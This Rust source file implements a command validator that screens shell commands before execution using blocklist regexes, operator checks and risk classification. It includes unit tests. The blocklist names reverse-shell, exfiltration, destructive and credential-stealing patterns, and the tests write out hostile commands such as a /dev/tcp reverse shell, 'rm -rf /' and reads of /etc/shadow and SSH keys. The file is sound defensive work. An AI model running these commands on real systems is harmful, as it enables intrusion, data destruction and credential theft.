use anyhow::Result;
use regex::Regex;
use tracing::{info, warn};

use crate::core::config::GuardianConfig;
use crate::core::types::RiskLevel;

/// Command Guardian — validates all shell commands before execution.
///
/// Implements a defense-in-depth approach:
/// 1. Blocklist matching (known dangerous commands)
/// 2. Heuristic analysis (pattern-based risk detection)
/// 3. Risk classification (Low/Medium/High/Critical)
/// 4. Human confirmation for high-risk commands
///
/// Designed to prevent:
/// - Command injection (CWE-78)
/// - Path traversal (CWE-22)
/// - Privilege escalation
/// - Data exfiltration
pub struct CommandGuardian {
    /// Compiled regex patterns for blocked commands
    blocked_patterns: Vec<Regex>,
    /// Explicitly allowed commands (override blocklist)
    allowed_commands: Vec<String>,
    /// Whether to block pipe operators
    block_pipes: bool,
    /// Whether to block output redirection
    block_redirects: bool,
    /// Whether to block subshell operators
    block_subshells: bool,
}

/// Built-in patterns that are always blocked regardless of configuration.
const ALWAYS_BLOCKED: &[&str] = &[
    // Destructive filesystem commands
    r"(?i)\brm\s+(-rf?|--recursive)\s+/",
    r"(?i)\bmkfs\b",
    r"(?i)\bdd\s+.*of=/dev/",
    r"(?i)\bformat\b",
    r"(?i)\bfdisk\b",
    // Privilege escalation
    r"(?i)\bsudo\b",
    r"(?i)\bsu\s+-",
    r"(?i)\bchmod\s+[0-7]*777\b",
    r"(?i)\bchown\s+root\b",
    r"(?i)\bsetuid\b",
    // Network exfiltration
    r"(?i)\bcurl\s+.*-d\b.*@",
    r"(?i)\bwget\s+.*--post-data\b",
    r"(?i)\bnc\s+-[el]",
    r"(?i)\bncat\b",
    r"(?i)\bsocat\b",
    // Reverse shells
    r"(?i)/dev/tcp/",
    r"(?i)\bbash\s+-i\b",
    r"(?i)\bpython[23]?\s+-c.*socket\b",
    r"(?i)\bperl\s+-e.*socket\b",
    // System manipulation
    r"(?i)\bsysctl\s+-w\b",
    r"(?i)\biptables\b",
    r"(?i)\bnft\b",
    r"(?i)\bkill\s+-9\s+1\b",
    r"(?i)\bshutdown\b",
    r"(?i)\breboot\b",
    r"(?i)\bhalt\b",
    r"(?i)\binit\s+0\b",
    // Cryptomining
    r"(?i)\bxmrig\b",
    r"(?i)\bminerd\b",
    r"(?i)\bcpuminer\b",
    // Container escape
    r"(?i)\bdocker\s+.*--privileged\b",
    r"(?i)\bnsenter\b",
    r"(?i)mount\s+.*-o.*bind\b",
    // Credential access
    r"(?i)\bcat\s+/etc/shadow\b",
    r"(?i)\bcat\s+.*\.ssh/\b",
    r"(?i)\bcat\s+.*\.env\b",
    r"(?i)\benv\s*$",
    r"(?i)\bprintenv\b",
    // History manipulation
    r"(?i)\bhistory\s+-c\b",
    r"(?i)\bunset\s+HISTFILE\b",
    r"(?i)export\s+HISTSIZE=0\b",
    // Stealer patterns — credential file access
    r"(?i)\bcat\s+.*\.ssh/(id_rsa|id_ed25519|id_ecdsa|id_dsa)\b",
    r"(?i)\bcat\s+.*\.aws/credentials\b",
    r"(?i)\bcat\s+.*\.kube/config\b",
    r"(?i)\bcat\s+.*\.docker/config\.json\b",
    r"(?i)\bcat\s+.*\.gnupg/\b",
    r"(?i)\bcat\s+.*\.netrc\b",
    // Stealer patterns — wallet access
    r"(?i)\bcat\s+.*\.(bitcoin|ethereum|solana|monero)/\b",
    r"(?i)\bcat\s+.*wallet\.(dat|json|key)\b",
    // Stealer patterns — browser credential access
    r"(?i)\bcat\s+.*(Login\s*Data|cookies\.sqlite|Cookies|Web\s*Data)\b",
    r"(?i)\bsqlite3\s+.*(Login\s*Data|cookies|Web\s*Data)\b",
    // Stealer patterns — keychain access
    r"(?i)\bsecurity\s+(find|dump|export)-(generic|internet)-password\b",
    r"(?i)\bcat\s+.*Keychains/\b",
    // Stealer patterns — encoding for exfiltration
    r"(?i)\bbase64\s+.*\.(ssh|aws|pem|key|env)\b",
    r"(?i)\btar\s+.*\.(ssh|aws|gnupg|bitcoin|ethereum)\b",
    r"(?i)\bzip\s+.*\.(ssh|aws|gnupg|bitcoin|ethereum)\b",
    // Stealer patterns — package registry credentials
    r"(?i)\bcat\s+.*\.(npmrc|pypirc|cargo/credentials)\b",
];

/// Patterns for risk classification (not blocked, but elevated risk).
const HIGH_RISK_PATTERNS: &[&str] = &[
    r"(?i)\bgit\s+(push|force|reset|rebase)\b",
    r"(?i)\brm\s",
    r"(?i)\bmv\s",
    r"(?i)\bchmod\b",
    r"(?i)\bchown\b",
    r"(?i)\bcurl\b",
    r"(?i)\bwget\b",
    r"(?i)\bssh\b",
    r"(?i)\bscp\b",
    r"(?i)\bnpm\s+(install|i|add)\b",
    r"(?i)\bpip\s+install\b",
    r"(?i)\bcargo\s+install\b",
    r"(?i)\bapt\s+(install|remove)\b",
    r"(?i)\bbrew\s+(install|uninstall)\b",
];

/// Subshell operators that could be used for injection.
const SUBSHELL_OPERATORS: &[&str] = &[
    "`",
    "$(",
    "${",
    "<(",
    ">(",
];

impl CommandGuardian {
    pub fn new(config: &GuardianConfig) -> Result<Self> {
        let mut blocked_patterns = Vec::new();

        // Compile always-blocked patterns
        for pattern in ALWAYS_BLOCKED {
            blocked_patterns.push(Regex::new(pattern)?);
        }

        // Compile user-configured blocked patterns
        for pattern in &config.blocked_patterns {
            blocked_patterns.push(Regex::new(pattern)?);
        }

        info!(
            "Command Guardian initialized with {} blocked patterns",
            blocked_patterns.len()
        );

        Ok(Self {
            blocked_patterns,
            allowed_commands: config.allowed_commands.clone(),
            block_pipes: config.block_pipes,
            block_redirects: config.block_redirects,
            block_subshells: config.block_subshells,
        })
    }

    /// Validate a command before execution.
    /// Returns Ok(()) if the command is allowed, or an error describing why it was blocked.
    pub fn validate_command(&self, command: &str) -> Result<()> {
        let command = command.trim();

        if command.is_empty() {
            anyhow::bail!("Empty command");
        }

        // Check if explicitly allowed
        let base_cmd = command.split_whitespace().next().unwrap_or("");
        if self.allowed_commands.iter().any(|c| c == base_cmd) {
            return Ok(());
        }

        // Check null bytes (CWE-158)
        if command.contains('\0') {
            anyhow::bail!("Command contains null bytes (CWE-158)");
        }

        // Check for blocked patterns
        for pattern in &self.blocked_patterns {
            if pattern.is_match(command) {
                warn!(
                    command = %Self::redact_command(command),
                    pattern = %pattern.as_str(),
                    "Command blocked by Guardian"
                );
                anyhow::bail!(
                    "Command blocked by security policy: matches blocked pattern"
                );
            }
        }

        // Check for subshell operators
        if self.block_subshells {
            for op in SUBSHELL_OPERATORS {
                if command.contains(op) {
                    anyhow::bail!(
                        "Command contains subshell operator '{}' which is blocked by policy",
                        op
                    );
                }
            }
        }

        // Check for pipe operators
        if self.block_pipes && command.contains('|') {
            // Allow || (logical OR) but block | (pipe)
            let chars: Vec<char> = command.chars().collect();
            for (i, &c) in chars.iter().enumerate() {
                if c == '|' {
                    let next = chars.get(i + 1).copied().unwrap_or(' ');
                    let prev = if i > 0 { chars[i - 1] } else { ' ' };
                    if next != '|' && prev != '|' {
                        anyhow::bail!("Pipe operator '|' is blocked by security policy");
                    }
                }
            }
        }

        // Check for output redirection
        if self.block_redirects {
            // Allow >> and > patterns in legitimate contexts like echo "text"
            // but block general redirection
            let re = Regex::new(r"[^-]>\s*[/~.]")?;
            if re.is_match(command) {
                anyhow::bail!("Output redirection is blocked by security policy");
            }
        }

        // Check for URL-encoded path traversal
        if command.contains("%2e%2e") || command.contains("%2f") || command.contains("%252e") {
            anyhow::bail!("URL-encoded path traversal detected (CWE-22)");
        }

        Ok(())
    }

    /// Classify the risk level of a command.
    pub fn classify_risk(&self, command: &str) -> RiskLevel {
        // Check high-risk patterns
        for pattern in HIGH_RISK_PATTERNS {
            if let Ok(re) = Regex::new(pattern) {
                if re.is_match(command) {
                    return RiskLevel::High;
                }
            }
        }

        // Check if command modifies state
        let state_modifying = ["write", "create", "delete", "update", "set", "put", "post"];
        let lower = command.to_lowercase();
        for keyword in &state_modifying {
            if lower.contains(keyword) {
                return RiskLevel::Medium;
            }
        }

        RiskLevel::Low
    }

    /// Number of blocked patterns (for diagnostics).
    pub fn blocked_count(&self) -> usize {
        self.blocked_patterns.len()
    }

    /// Redact a command for safe logging (remove potential secrets).
    fn redact_command(command: &str) -> String {
        // Redact anything after common secret-passing patterns
        let patterns = [
            (r"(?i)(token|key|password|secret|credential)\s*=\s*\S+", "$1=***REDACTED***"),
            (r"(?i)bearer\s+\S+", "Bearer ***REDACTED***"),
        ];

        let mut result = command.to_string();
        for (pattern, replacement) in &patterns {
            if let Ok(re) = Regex::new(pattern) {
                result = re.replace_all(&result, *replacement).to_string();
            }
        }
        result
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn default_guardian() -> CommandGuardian {
        CommandGuardian::new(&GuardianConfig::default()).unwrap()
    }

    #[test]
    fn test_blocks_rm_rf_root() {
        let g = default_guardian();
        assert!(g.validate_command("rm -rf /").is_err());
    }

    #[test]
    fn test_blocks_sudo() {
        let g = default_guardian();
        assert!(g.validate_command("sudo apt install something").is_err());
    }

    #[test]
    fn test_blocks_reverse_shell() {
        let g = default_guardian();
        assert!(g.validate_command("bash -i >& /dev/tcp/10.0.0.1/4242 0>&1").is_err());
    }

    #[test]
    fn test_blocks_subshell() {
        let g = default_guardian();
        assert!(g.validate_command("echo $(whoami)").is_err());
    }

    #[test]
    fn test_blocks_null_bytes() {
        let g = default_guardian();
        assert!(g.validate_command("cat file\0.txt").is_err());
    }

    #[test]
    fn test_blocks_url_encoded_traversal() {
        let g = default_guardian();
        assert!(g.validate_command("cat %2e%2e/etc/passwd").is_err());
    }

    #[test]
    fn test_allows_safe_commands() {
        let g = default_guardian();
        assert!(g.validate_command("ls -la").is_ok());
        assert!(g.validate_command("echo hello").is_ok());
        assert!(g.validate_command("cat README.md").is_ok());
        assert!(g.validate_command("git status").is_ok());
    }

    #[test]
    fn test_blocks_pipe_but_allows_logical_or() {
        let g = default_guardian();
        assert!(g.validate_command("cat file | grep secret").is_err());
        assert!(g.validate_command("test -f file || echo missing").is_ok());
    }

    #[test]
    fn test_risk_classification() {
        let g = default_guardian();
        assert_eq!(g.classify_risk("ls -la"), RiskLevel::Low);
        assert_eq!(g.classify_risk("rm file.txt"), RiskLevel::High);
        assert_eq!(g.classify_risk("curl https://example.com"), RiskLevel::High);
        assert_eq!(g.classify_risk("git push origin main"), RiskLevel::High);
    }

    #[test]
    fn test_blocks_empty_command() {
        let g = default_guardian();
        assert!(g.validate_command("").is_err());
        assert!(g.validate_command("   ").is_err());
    }

    #[test]
    fn test_blocks_credential_access() {
        let g = default_guardian();
        assert!(g.validate_command("cat /etc/shadow").is_err());
        assert!(g.validate_command("cat ~/.ssh/id_rsa").is_err());
    }

    #[test]
    fn test_redact_command() {
        let redacted = CommandGuardian::redact_command("curl -H 'Authorization: Bearer sk-abc123' https://api.example.com");
        assert!(redacted.contains("REDACTED"));
        assert!(!redacted.contains("sk-abc123"));
    }
}
